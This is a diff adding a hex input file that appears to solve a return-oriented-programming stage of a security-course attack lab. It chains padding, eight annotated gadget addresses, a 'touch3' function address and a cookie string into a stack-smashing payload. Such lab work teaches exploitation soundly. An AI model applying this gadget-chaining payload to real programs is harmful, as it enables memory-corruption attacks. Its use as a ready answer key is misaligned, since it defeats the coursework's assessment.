@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+00 00 00 00 00 00 00 00 /* padding for 56 bytes */
+c3 1a 40 00 00 00 00 00 /* gadget 1: movq %rsp, %rax */
+bc 1a 40 00 00 00 00 00 /* gadget 2: movl %eax, %ecx */
+ae 1a 40 00 00 00 00 00 /* gadget 3: movl %ecx, %edx */
+df 1a 40 00 00 00 00 00 /* gadget 4: movl %edx, %esi */
+90 1a 40 00 00 00 00 00 /* gadget 5: popq %rax */
+01 00 00 00 00 00 00 00 /* offset rsp for string */
+66 1a 40 00 00 00 00 00 /* gadget 6: movq %rax, %rdi */
+a0 1a 40 00 00 00 00 00 /* gadget 7: lea (%rdi, %rsi, 1), %rax */
+66 1a 40 00 00 00 00 00 /* gadget 8: movq %rax, %rdi */
+c8 19 40 00 00 00 00 00 /* address of touch3 */
+32 37 36 61 64 65 65 37 00 /* cookie as string with null terminator */
